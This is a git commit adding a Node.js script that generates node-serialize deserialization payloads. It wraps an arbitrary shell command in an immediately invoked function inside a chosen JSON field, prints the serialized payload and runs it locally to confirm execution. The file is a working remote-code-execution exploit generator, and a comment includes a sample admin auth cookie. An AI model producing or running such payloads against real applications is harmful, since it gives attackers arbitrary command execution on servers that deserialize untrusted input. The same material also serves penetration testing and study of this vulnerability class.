773fee9829f1642604e0853d13d9a87c34ee59a4
Dobliuw <owenpbonoris@gmail.com>
2023-08-11 12:53:06 -0400

    Adding a new function that creates IIFE functions to abuse deserealization attacks in NodeJS

---
+++ IIFE_generator.js
@@ -0,0 +1,34 @@
+const s = require('node-serialize')
+const { exec } = require('child_process')
+// auth cookie = {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
+
+function help(){
+	console.log(`\n\n\t[!] Usage: node ${process.argv[1]} {command_to_execute} {json} {camp_to_insert_IIFE}\n`)
+	console.log(`\t Example: node ${process.argv[1]} "whoami" "{'user':'test','password':'test'}" "user"`)
+	console.log(`\n\t[+] Output: {'user': IIFE_Function, 'password':'test'}\n\n`)
+	exec('exit 1')
+}
+
+function testIIFE(cmd){
+	console.log("[+] If the IIFE works you'll see your output command down here:\n-----------------------------------------------------\n")
+	output = s.unserialize(cmd)
+}
+
+
+command = process.argv[2]
+payload = process.argv[3].replaceAll('\'', '"')
+vuln_camp = process.argv[4]
+
+if(!command && !payload && !vuln_camp){
+	help()
+}else{
+	payload = JSON.parse(payload)
+	payload[vuln_camp] = new Function(`require('child_process').exec('${command}', (err, stdout, stderr) => stdout ? console.log(stdout) : null)`)
+	const payload_serialize = s.serialize(payload)
+	const final_payload = payload_serialize.replace(': null)\\n}', ': null)\\n}()');
+	console.log(`\n\n[!] Here is your IIFE: \n\n${final_payload}\n`)
+	testIIFE(final_payload)
+}
+
+
+
